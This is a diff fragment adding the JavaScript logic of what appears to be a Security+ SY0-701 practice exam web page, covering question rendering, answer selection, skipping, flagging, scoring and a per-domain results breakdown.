+  document.getElementById('progress-fill').style.width = ((currentQ / questions.length) * 100) + '%';
+  document.getElementById('btn-next').disabled = (results[currentQ] === null || results[currentQ] === 'skip') ? true : false;
+  answered = results[currentQ] !== null && results[currentQ] !== 'skip';
+
+  const btn = document.getElementById('btn-flag');
+  btn.className = 'btn btn-flag' + (flagged.has(currentQ) ? ' flagged' : '');
+  btn.textContent = flagged.has(currentQ) ? '⚑ Flagged' : '⚑ Flag';
+
+  const letters = ['A','B','C','D'];
+  const scenarioHTML = q.scenario ? `<div class="q-scenario">${q.scenario}</div>` : '';
+  const optionsHTML = q.options.map((opt, i) => {
+    let cls = 'option';
+    if (answered) {
+      cls += ' disabled';
+      if (i === q.correct) cls += results[currentQ] === false ? ' reveal-correct' : ' correct';
+      else if (answered && results[currentQ] === false && i === q.options.indexOf(q.options.find((o,idx) => idx !== q.correct && results[currentQ] !== null))) cls += '';
+    }
+    return `<div class="${cls}" id="opt-${i}" onclick="selectOption(${i})">
+      <div class="option-letter">${letters[i]}</div>
+      <div class="option-text">${opt}</div>
+    </div>`;
+  }).join('');
+
+  document.getElementById('question-container').innerHTML = `
+    <div class="domain-badge"><div class="domain-dot"></div>${q.domain}</div>
+    <div class="question-card">
+      <div class="q-number">Question ${currentQ + 1} of ${questions.length}</div>
+      <div class="q-text">${q.text}</div>
+      ${scenarioHTML}
+      <div class="options">${optionsHTML}</div>
+      <div class="explanation ${answered ? 'show' : ''}" id="explanation">
+        <div class="explanation-title">▶ Explanation</div>
+        <div class="explanation-text">${q.explanation}</div>
+      </div>
+    </div>`;
+
+  // Re-apply correct state visually for revisited questions
+  if (answered && results[currentQ] !== 'skip') {
+    const isCorrect = results[currentQ] === true;
+    const selectedIdx = isCorrect ? q.correct : q.options.findIndex((_, i) => i !== q.correct && document.getElementById(`opt-${i}`)?.classList.contains('wrong'));
+    const opts = document.querySelectorAll('.option');
+    opts.forEach(o => o.classList.add('disabled'));
+    opts[q.correct].classList.remove('reveal-correct');
+    opts[q.correct].classList.add(isCorrect ? 'correct' : 'reveal-correct');
+  }
+}
+
+function selectOption(idx) {
+  if (answered) return;
+  answered = true;
+  const q = questions[currentQ];
+  const isCorrect = idx === q.correct;
+  results[currentQ] = isCorrect ? true : false;
+
+  if (isCorrect) correctCount++;
+  else wrongCount++;
+
+  document.getElementById('stat-correct').textContent = correctCount;
+
+  const opts = document.querySelectorAll('.option');
+  opts.forEach(o => o.classList.add('disabled'));
+  opts[idx].classList.add(isCorrect ? 'correct' : 'wrong');
+  if (!isCorrect) opts[q.correct].classList.add('reveal-correct');
+
+  document.getElementById('explanation').classList.add('show');
+  document.getElementById('btn-next').disabled = false;
+  buildAnsweredMap();
+}
+
+function nextQuestion() {
+  currentQ++;
+  if (currentQ >= questions.length) { showResults(); return; }
+  renderQuestion();
+  buildAnsweredMap();
+}
+
+function skipQuestion() {
+  if (results[currentQ] === null) { results[currentQ] = 'skip'; skippedCount++; }
+  currentQ++;
+  if (currentQ >= questions.length) { showResults(); return; }
+  renderQuestion();
+  buildAnsweredMap();
+}
+
+function toggleFlag() {
+  if (flagged.has(currentQ)) flagged.delete(currentQ);
+  else flagged.add(currentQ);
+  const btn = document.getElementById('btn-flag');
+  btn.className = 'btn btn-flag' + (flagged.has(currentQ) ? ' flagged' : '');
+  btn.textContent = flagged.has(currentQ) ? '⚑ Flagged' : '⚑ Flag';
+  buildAnsweredMap();
+}
+
+function showResults() {
+  clearInterval(timerInterval);
+  document.getElementById('exam-screen').style.display = 'none';
+  const rs = document.getElementById('results-screen');
+  rs.style.display = 'block';
+
+  const pct = Math.round((correctCount / questions.length) * 100);
+  document.getElementById('final-score').textContent = correctCount;
+  document.getElementById('br-correct').textContent = correctCount;
+  document.getElementById('br-wrong').textContent = wrongCount;
+  document.getElementById('br-skipped').textContent = skippedCount;
+  document.getElementById('br-pct').textContent = pct + '%';
+
+  let verdict, sub;
+  if (pct >= 83) { verdict = '✅ Exam Passed'; sub = 'Excellent work! You\'re well-prepared for the SY0-701 exam.'; }
+  else if (pct >= 70) { verdict = '⚠️ Nearly There'; sub = 'Good effort — review missed questions and focus on weak domains.'; }
+  else { verdict = '❌ Needs More Study'; sub = 'Review the explanations for each missed question and revisit weak domains.'; }
+
+  document.getElementById('result-verdict').textContent = verdict;
+  document.getElementById('result-sub').textContent = sub;
+
+  // Domain breakdown
+  const dStats = {};
+  questions.forEach((q, i) => {
+    const d = q.domain.split(' – ')[0];
+    if (!dStats[d]) dStats[d] = { correct: 0, total: 0, name: q.domain.split(' – ')[1] || d };
+    dStats[d].total++;
+    if (results[i] === true) dStats[d].correct++;
+  });
+
+  const dbEl = document.getElementById('domain-breakdown');
+  dbEl.innerHTML = Object.entries(dStats).map(([key, v]) => {
+    const p = Math.round((v.correct / v.total) * 100);
+    const color = p >= 83 ? 'var(--success)' : p >= 60 ? 'var(--accent)' : 'var(--danger)';
+    return `<div class="domain-row">
+      <div class="domain-name">${key}</div>
+      <div class="domain-bar-wrap"><div class="domain-bar-fill" style="width:${p}%;background:${color}"></div></div>
+      <div class="domain-score">${v.correct}/${v.total}</div>
+    </div>`;
+  }).join('');
+}
+
+function restartExam() {
+  currentQ = 0; correctCount = 0; wrongCount = 0; skippedCount = 0;
+  secondsLeft = 90 * 60; answered = false;
+  results = new Array(questions.length).fill(null);
+  flagged = new Set();
+  document.getElementById('results-screen').style.display = 'none';
+  document.getElementById('exam-screen').style.display = 'none';
+  document.getElementById('intro-screen').classList.remove('hidden');
+  document.getElementById('header-stats').style.display = 'none';
+  document.getElementById('timer').textContent = '90:00';
+  document.getElementById('timer').className = 'timer';
+  document.getElementById('stat-correct').textContent = '0';
+  document.getElementById('stat-remaining').textContent = questions.length;
+}
+</script>
+</body>
+</html>
